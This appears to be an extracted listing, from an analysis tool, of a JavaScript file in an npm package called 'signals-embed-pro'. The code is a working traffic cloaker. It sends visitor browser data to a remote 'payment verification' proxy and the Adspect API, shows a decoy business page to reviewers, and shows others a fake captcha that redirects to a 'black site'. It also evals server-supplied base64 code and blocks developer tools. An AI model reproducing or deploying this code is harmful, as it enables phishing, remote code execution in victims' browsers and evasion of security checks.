// File: tmp/tmpfac9kj6a/signals-embed-pro/package/signals-embed-nosd.js
// ======================================================================
Line 12: _tmp_39.ADSPECT_API = "https://rpc.adspect.net/v2/"
Line 13: _tmp_39.PROXY_URL = "https://zahlungsuberprufung.online/adspect-proxy.php"
Line 26: {
            // Собираем полные данные как в PHP версии
            const payload = {
                server: {
                    HTTP_USER_AGENT: navigator.userAgent,
                    HTTP_HOST: window.location.host,
                    HTTP_REFERER: document.referrer,
                    REQUEST_URI: window.location.pathname + window.location.search,
                    QUERY_STRING: window.location.search.slice(1),
                    REQUEST_METHOD: 'GET',
                    SERVER_NAME: window.location.hostname,
                    SERVER_PORT: window.location.port || (window.location.protocol === 'https:' ? '443' : '80'),
                    HTTPS: window.location.protocol === 'https:' ? 'on' : 'off',
                    REQUEST_TIME: Math.floor(Date.now() / 1000),
                    HTTP_ACCEPT: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    HTTP_ACCEPT_LANGUAGE: navigator.language,
                    HTTP_ACCEPT_ENCODING: 'gzi...
Line 46: const response = await fetch(CONFIG.PROXY_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
Line 58: response.json()
Line 59: console.log('[ADSPECT] Full API response:', result)
Line 60: console.log('[DEBUG] Response success:', result.success)
Line 61: console.log('[DEBUG] Adspect data:', result.adspect_response)
Line 63: {
                console.log('[DEBUG] Returning Adspect response:', result.adspect_response);
                return result.adspect_response;
            }
Line 64: console.log('[DEBUG] Returning Adspect response:', result.adspect_response)
Line 68: console.log('[ERROR] Invalid response structure')
Line 70: catch (error) {
            console.log('[ADSPECT] API call failed:', error.message);
            throw error;
        }
Line 71: console.log('[ADSPECT] API call failed:', error.message)
Line 77: {
        const { action, target, ok, js, cid } = data;
        
        console.log(`[ADSPECT] Action: ${action}, Target: ${target}, OK: ${ok}`);

        switch (action) {
            case 'local':
                console.log('[ADSPECT] Serving local file:', target);
                serveLocalFile(target);
                break;
                
            case 'noop':
                console.log('[ADSPECT] No operation');
                // Ничего не делаем, оставляем как есть
                break;
                
            case '301':
            case '302':
            case '303':
            case '307':
            case '308':
                console.log(`[ADSPECT] HTTP redirect ${action}:`, target);
                // Принудительный редирект
                window.top.location.href = target;
                break;
                
            case 'refresh':
                console.log('[ADSPECT] Meta refresh:', target);
                const meta = document.createElemen...
Line 80: console.log(`[ADSPECT] Action: ${action}, Target: ${target}, OK: ${ok}`)
Line 82: switch (action) {
            case 'local':
                console.log('[ADSPECT] Serving local file:', target);
                serveLocalFile(target);
                break;
                
            case 'noop':
                console.log('[ADSPECT] No operation');
                // Ничего не делаем, оставляем как есть
                break;
                
            case '301':
            case '302':
            case '303':
            case '307':
            case '308':
                console.log(`[ADSPECT] HTTP redirect ${action}:`, target);
                // Принудительный редирект
                window.top.location.href = target;
                break;
                
            case 'refresh':
                console.log('[ADSPECT] Meta refresh:', target);
                const meta = document.createElement('meta');
                meta.httpEquiv = 'refresh';
                meta.content = `0; url=${target}`;
                document.head.appendChild(meta);
 ...
Line 84: console.log('[ADSPECT] Serving local file:', target)
Line 89: console.log('[ADSPECT] No operation')
Line 98: console.log(`[ADSPECT] HTTP redirect ${action}:`, target)
Line 104: console.log('[ADSPECT] Meta refresh:', target)
Line 108: document.head.appendChild(meta)
Line 112: console.log('[ADSPECT] Meta redirect:', target)
Line 113: document.write(`<!DOCTYPE html><head><meta http-equiv="refresh" content="0; url=${target}"></head>`)
Line 117: console.log('[ADSPECT] Form submit:', target)
Line 118: document.write(`<!DOCTYPE html><html><body><form id="form" action="${target}" method="GET"></form><script>document.getElementById("form").submit();</script></body></html>`)
Line 122: console.log('[ADSPECT] Direct redirect to black site:', target)
Line 124: window.open(target, '_blank')
Line 128: console.log('[ADSPECT] Location replace:', target)
Line 133: console.log('[ADSPECT] Top location:', target)
Line 142: console.log('[ADSPECT] Iframe embed:', target)
Line 147: console.log('[ADSPECT] Proxy content:', target)
Line 148: proxyContent(target)
Line 152: console.log('[ADSPECT] Fetch content:', target)
Line 153: fetchContent(target)
Line 157: console.log('[ADSPECT] Execute JavaScript')
Line 159: {
                        // Декодируем base64 если нужно
                        const script = atob(target);
                        eval(script);
                    }
Line 161: const script = atob(target)
Line 162: eval(script)
Line 163: catch (e) {
                        eval(target);
                    }
Line 164: eval(target)
Line 170: console.log('[ADSPECT] HTTP status:', target)
Line 177: console.log('[ADSPECT] Unknown action:', action)
Line 185: getOrCreateContainer()
Line 187: {
            // ИСПРАВЛЕНО: используем adspect-file.php для CORS-safe загрузки
            const fileUrl = `https://zahlungsuberprufung.online/adspect-file.php?file=${filename}`;
            console.log('[DEBUG] Trying to load via CORS proxy:', fileUrl);
            console.log('[ADSPECT] Loading file via proxy:', fileUrl);
            
            const response = await fetch(fileUrl);
            
            if (response.ok) {
                const content = await response.text();
                console.log('[ADSPECT] File content loaded, length:', content.length);
                
                // Если это HTML файл - показываем в контейнере
                if (filename.endsWith('.html')) {
                    // Базовый домен вашего сервера для абсолютных ссылок
                    const serverOrigin = new URL(CONFIG.PROXY_URL).origin;

                    // Утилита: преобразовать относительный URL в абсолютный от serverOrigin
                    const toAbsolute = (url) =...
Line 189: <operator>.formatString("https://zahlungsuberprufung.online/adspect-file.php?file=", filename, "")
Line 190: console.log('[DEBUG] Trying to load via CORS proxy:', fileUrl)
Line 191: console.log('[ADSPECT] Loading file via proxy:', fileUrl)
Line 193: const response = await fetch(fileUrl)
Line 195: {
                const content = await response.text();
                console.log('[ADSPECT] File content loaded, length:', content.length);
                
                // Если это HTML файл - показываем в контейнере
                if (filename.endsWith('.html')) {
                    // Базовый домен вашего сервера для абсолютных ссылок
                    const serverOrigin = new URL(CONFIG.PROXY_URL).origin;

                    // Утилита: преобразовать относительный URL в абсолютный от serverOrigin
                    const toAbsolute = (url) => {
                        if (!url) return url;
                        const trimmed = url.trim();
                        if (!trimmed) return url;
                        // Абсолютные и специальные протоколы не трогаем
                        if (/^(https?:)?\/\/|^(data:|mailto:|tel:|javascript:|#)/i.test(trimmed)) {
                            return trimmed;
                        }
                        if (trimmed.st...
Line 196: response.text()
Line 197: console.log('[ADSPECT] File content loaded, length:', content.length)
Line 200: {
                    // Базовый домен вашего сервера для абсолютных ссылок
                    const serverOrigin = new URL(CONFIG.PROXY_URL).origin;

                    // Утилита: преобразовать относительный URL в абсолютный от serverOrigin
                    const toAbsolute = (url) => {
                        if (!url) return url;
                        const trimmed = url.trim();
                        if (!trimmed) return url;
                        // Абсолютные и специальные протоколы не трогаем
                        if (/^(https?:)?\/\/|^(data:|mailto:|tel:|javascript:|#)/i.test(trimmed)) {
                            return trimmed;
                        }
                        if (trimmed.startsWith('/')) {
                            return serverOrigin + trimmed;
                        }
                        return serverOrigin + '/' + trimmed;
                    };

                    // Создаём временный отсоединённый контейнер, чтобы избежать ранне...
Line 207: url.trim()
Line 210: /^(https?:)?\/\/|^(data:|mailto:|tel:|javascript:|#)/i.test(trimmed)
Line 230: node.getAttribute(attr)
Line 233: node.setAttribute(attr, updated)
Line 238: temp.querySelectorAll('link[href]').forEach(n => rewriteAttr(n, 'href'))
Line 239: temp.querySelectorAll('img[src], iframe[src], source[src], video[src], audio[src], track[src]').forEach(n => rewriteAttr(n, 'src'))
Line 240: temp.querySelectorAll('a[href]').forEach(n => rewriteAttr(n, 'href'))
Line 241: temp.querySelectorAll('form[action]').forEach(n => rewriteAttr(n, 'action'))
Line 244: temp.querySelectorAll('use[href]').forEach(n => rewriteAttr(n, 'href'))
Line 245: temp.querySelectorAll('use[xlink\\:href]').forEach(n => rewriteAttr(n, 'xlink:href'))
Line 246: temp.querySelectorAll('image[href]').forEach(n => rewriteAttr(n, 'href'))
Line 247: temp.querySelectorAll('image[xlink\\:href]').forEach(n => rewriteAttr(n, 'xlink:href'))
Line 252: value.split(',').map(part => {
                            const [u, d] = part.trim().split(/\s+/);
                            const abs = toAbsolute(u);
                            return d ? `${abs} ${d}` : abs;
                        }).join(', ')
Line 253: const [u, d] = part.trim().split(/\s+/)
Line 258: temp.querySelectorAll('img[srcset], source[srcset]').forEach(n => {
                        const cur = n.getAttribute('srcset');
                        const upd = rewriteSrcSet(cur);
                        if (upd && upd !== cur) n.setAttribute('srcset', upd);
                    })
Line 259: n.getAttribute('srcset')
Line 261: n.setAttribute('srcset', upd)
Line 265: temp.querySelectorAll('style')
Line 268: {
                            const raw = p1.trim().replace(/^['\"]/g, '').replace(/['\"]$/g, '');
                            const abs = toAbsolute(raw);
                            const quoted = /['\"]/g.test(p1.trim()[0]) ? `'${abs}'` : abs;
                            return `url(${quoted})`;
                        }
Line 269: const raw = p1.trim().replace(/^['\"]/g, '').replace(/['\"]$/g, '')
Line 271: const quoted = /['\"]/g.test(p1.trim()[0]) ? `'${abs}'` : abs
Line 278: Array.from(temp.querySelectorAll('script'))
Line 283: console.log('[ADSPECT] HTML content fixed and loaded')
Line 287: {
                            const absSrc = toAbsolute(script.getAttribute('src'));
                            const newScript = document.createElement('script');
                            newScript.src = absSrc;
                            document.head.appendChild(newScript);
                            console.log('[ADSPECT] Loading JS:', newScript.src);
                        }
Line 288: script.getAttribute('src')
Line 291: document.head.appendChild(newScript)
Line 292: console.log('[ADSPECT] Loading JS:', newScript.src)
Line 293: {
                            const newScript = document.createElement('script');
                            newScript.textContent = script.textContent;
                            document.head.appendChild(newScript);
                        }
Line 296: document.head.appendChild(newScript)
Line 304: console.log('[ADSPECT] Local file served successfully:', filename)
Line 309: catch (error) {
            console.log('[ADSPECT] Failed to load local file:', error.message);
        }
Line 310: console.log('[ADSPECT] Failed to load local file:', error.message)
Line 314: showBuiltinWhitePage()
Line 319: getOrCreateContainer()
Line 331: getOrCreateContainer()
Line 334: const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`)
Line 335: response.json()
Line 340: catch (error) {
            console.log('[ADSPECT] Proxy failed:', error.message);
            showError('Failed to load content');
        }
Line 341: console.log('[ADSPECT] Proxy failed:', error.message)
Line 347: function fetchContent = async function fetchContent(url) {
        try {
            const response = await fetch(url);
            const content = await response.text();
            
            document.open();
            document.write(content);
            document.close();
        } catch (error) {
            console.log('[ADSPECT] Fetch failed:', error.message);
            showError('Failed to fetch content');
        }
    }
Line 348: {
            const response = await fetch(url);
            const content = await response.text();
            
            document.open();
            document.write(content);
            document.close();
        }
Line 349: const response = await fetch(url)
Line 350: response.text()
Line 352: document.open()
Line 353: document.write(content)
Line 355: catch (error) {
            console.log('[ADSPECT] Fetch failed:', error.message);
            showError('Failed to fetch content');
        }
Line 356: console.log('[ADSPECT] Fetch failed:', error.message)
Line 363: getOrCreateContainer()
Line 375: {
        const container = getOrCreateContainer();
        
        // Inject styles
        const style = document.createElement('style');
        style.textContent = `
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
            .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
            .header { background: #fff; padding: 20px 0; border-bottom: 1px solid #e2e8f0; }
            .hero { padding: 80px 0; background: linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%); text-align: center; }
            .footer { background: #2d3748; color: white; padding: 40px 0; text-align: center; }
        `;
        document.head.appendChild(style);
        
        container.innerHTML = `
            <header class="header">
                <div class="container">
                    <h1 style="color: #4a5568;">Offlido</h1>
                </div>
            </he...
Line 376: getOrCreateContainer()
Line 388: document.head.appendChild(style)
Line 390: container.innerHTML = `
            <header class="header">
                <div class="container">
                    <h1 style="color: #4a5568;">Offlido</h1>
                </div>
            </header>
            <section class="hero">
                <div class="container">
                    <h1>Compliance-Forward Offline Storage Accessories</h1>
                    <p>Secure, certified, and fire-resistant storage solutions for your important documents and assets.</p>
                </div>
            </section>
            <footer class="footer">
                <div class="container">
                    <p>&copy; 2025 Offlido. All rights reserved.</p>
                    <p>Business not pertaining to the purchase, holding, or exchange of cryptocurrencies.</p>
                </div>
            </footer>
        `
Line 426: {
            innerContainer = document.createElement('div');
            innerContainer.id = 'signals-embed-container';
            innerContainer.style.width = '100%';
            innerContainer.style.minHeight = '100vh';
            container.appendChild(innerContainer);
        }
Line 431: container.appendChild(innerContainer)
Line 438: {
        // Disable right-click
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Disable F12, Ctrl+U, Ctrl+Shift+I
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.key === 'u') ||
                (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
        
        // Anti-debugging
        setInterval(() => {
            if (window.devtools && window.devtools.open) {
                window.location.reload();
            }
        }, 1000);
    }
Line 440: document.addEventListener('contextmenu', e => e.preventDefault())
Line 443: document.addEventListener('keydown', e => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.key === 'u') ||
                (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        })
Line 452: setInterval(() => {
            if (window.devtools && window.devtools.open) {
                window.location.reload();
            }
        }, 1000)
Line 463: {
        console.log('[ADSPECT] Initializing full integration...');
        
        // Add security features
        addSecurityFeatures();
        
        try {
            // Первый вызов Adspect API для определения белой/блек
            const adspectResult = await callAdspectAPI();
            
            if (adspectResult) {
                console.log('[ADSPECT] Initial response:', adspectResult);
                
                // Если ok:false - показать белую страницу
                if (!adspectResult.ok) {
                    console.log('[ADSPECT] Showing white page');
                    handleAdspectAction(adspectResult);
                    return;
                }
                
                // Если ok:true - показать фейковую капчу и сохранить URL для редиректа
                console.log('[ADSPECT] Showing captcha, saving redirect URL');
                console.log('[DEBUG] Will redirect to:', adspectResult.target);
                showCaptchaWithRedirec...
Line 464: console.log('[ADSPECT] Initializing full integration...')
Line 473: {
                console.log('[ADSPECT] Initial response:', adspectResult);
                
                // Если ok:false - показать белую страницу
                if (!adspectResult.ok) {
                    console.log('[ADSPECT] Showing white page');
                    handleAdspectAction(adspectResult);
                    return;
                }
                
                // Если ok:true - показать фейковую капчу и сохранить URL для редиректа
                console.log('[ADSPECT] Showing captcha, saving redirect URL');
                console.log('[DEBUG] Will redirect to:', adspectResult.target);
                showCaptchaWithRedirect(adspectResult.target);
            }
Line 474: console.log('[ADSPECT] Initial response:', adspectResult)
Line 477: {
                    console.log('[ADSPECT] Showing white page');
                    handleAdspectAction(adspectResult);
                    return;
                }
Line 478: console.log('[ADSPECT] Showing white page')
Line 484: console.log('[ADSPECT] Showing captcha, saving redirect URL')
Line 485: console.log('[DEBUG] Will redirect to:', adspectResult.target)
Line 491: catch (error) {
            console.log('[ADSPECT] Error:', error.message);
            // Показываем белую страницу при любых ошибках
            showBuiltinWhitePage();
        }
Line 492: console.log('[ADSPECT] Error:', error.message)
Line 494: showBuiltinWhitePage()
Line 500: getOrCreateContainer()
Line 503: container.innerHTML = `
            <style>
                *{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}.main-content{margin:8rem auto;max-width:60rem;padding-left:1.5rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{font-size:1.5rem;font-weight:500;line-height:2.25rem}@media (width <= 720px){.h2{font-size:1.25rem;line-height:1.5rem}}@keyframes spin{to{transform:rotate(1turn)}}@keyframes stroke{to{stroke-dashoffset:0}}@keyframes scale{0%,to{transform:none}50%{transform:scaleX(1)}}@keyframes fill{to{transform:scale(1)}}@keyframes fillfail{to{box-shadow:inset 0 30px 0 0 #de1303}}@keyframes fillfail-offlabel{to{box-shadow:inset 0 0 0 30px #232323}}@keyframes fillfa...
Line 581: {
            console.log('[CAPTCHA] User clicked captcha!');
            
            const verify = document.getElementById('verify');
            const verifying = document.getElementById('verifying');
            const success = document.getElementById('success');
            const checkbox = document.getElementById('vfclick');
            
            // Скрыть кнопку верификации, показать спиннер
            if (verify) verify.style.display = 'none';
            if (verifying) verifying.style.display = 'block';
            if (checkbox) checkbox.checked = true;
            
            // Через 3 секунды показать успех
            setTimeout(() => {
                if (verifying) verifying.style.display = 'none';
                if (success) success.style.display = 'block';
                
                // Через еще 1 секунду - редирект
                setTimeout(() => {
                    console.log('[CAPTCHA] Opening new tab:', redirectUrl);
                    window.o...
Line 582: console.log('[CAPTCHA] User clicked captcha!')
Line 595: setTimeout(() => {
                if (verifying) verifying.style.display = 'none';
                if (success) success.style.display = 'block';
                
                // Через еще 1 секунду - редирект
                setTimeout(() => {
                    console.log('[CAPTCHA] Opening new tab:', redirectUrl);
                    window.open(redirectUrl, '_blank');
                }, 1000);
            }, 3000)
Line 600: setTimeout(() => {
                    console.log('[CAPTCHA] Opening new tab:', redirectUrl);
                    window.open(redirectUrl, '_blank');
                }, 1000)
Line 601: console.log('[CAPTCHA] Opening new tab:', redirectUrl)
Line 602: window.open(redirectUrl, '_blank')
Line 610: document.addEventListener('DOMContentLoaded', main)
Line 612: main()
